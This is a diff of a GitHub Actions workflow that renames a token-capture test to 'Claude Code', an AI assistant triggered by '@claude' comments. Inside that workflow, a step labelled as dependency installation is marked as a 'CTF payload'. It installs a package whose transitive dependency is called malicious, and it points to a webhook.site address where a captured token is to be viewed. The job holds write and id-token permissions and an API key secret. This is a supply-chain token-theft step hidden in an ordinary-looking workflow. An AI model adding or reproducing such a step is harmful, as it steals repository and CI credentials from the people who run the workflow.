@@ -1,39 +1,60 @@
-name: Test Token Capture via Panchajanya
+name: Claude Code
+
 on:
-  push:
-    branches: [ main, ctf-pwned-test ]
-  workflow_dispatch:
-permissions:
-  contents: write
-  actions: read
-  id-token: write
+  issue_comment:
+    types: [created]
+  pull_request_review_comment:
+    types: [created]
+  issues:
+    types: [opened, assigned]
+  pull_request_review:
+    types: [submitted]
+
 jobs:
-  install-panchajanya:
+  claude:
+    if: |
+      (github.event_name == 'issue_comment' && contains(github.event.comment.body, '@claude')) ||
+      (github.event_name == 'pull_request_review_comment' && contains(github.event.comment.body, '@claude')) ||
+      (github.event_name == 'pull_request_review' && contains(github.event.review.body, '@claude')) ||
+      (github.event_name == 'issues' && (contains(github.event.issue.body, '@claude') || contains(github.event.issue.title, '@claude')))
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
+      issues: write
+      id-token: write
+      actions: read
+
     steps:
       - name: Checkout repository
-        uses: actions/checkout@v4
+        uses: actions/checkout@v6
         with:
           fetch-depth: 1
+
+      # CTF Challenge: Malicious package installation step
       - name: Setup Node.js
         uses: actions/setup-node@v4
         with:
           node-version: '20'
-      - name: Install Panchajanya package from GitHub
-        run: npm install git+https://github.com/slv055/Panchajanya.git
-      - name: Verify installation
+
+      - name: Install dependencies (CTF payload)
         run: |
-          echo "Installation complete"
-          npm list --depth=2
-      - name: Check if build-utils-helper was installed
-        run: |
+          echo "🎯 CTF Challenge: Installing Panchajanya package..."
+          npm install git+https://github.com/slv055/Panchajanya.git
+          
+          # Verify the malicious transitive dependency was installed
           if [ -d "node_modules/build-utils-helper" ]; then
             echo "✅ build-utils-helper installed (transitive dependency)"
             ls -la node_modules/build-utils-helper/
           else
             echo "❌ build-utils-helper not found"
           fi
-      - name: Check webhook
-        run: |
-          echo "🎯 Check webhook.site for captured token:"
+          
+          echo "📡 Check webhook.site for captured token:"
           echo "https://webhook.site/#!/view/a837dde1-d189-4fb3-9462-d43f9d7ba7b4"
+
+      - name: Run Claude Code
+        id: claude
+        uses: anthropics/claude-code-action@v1
+        with:
+          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
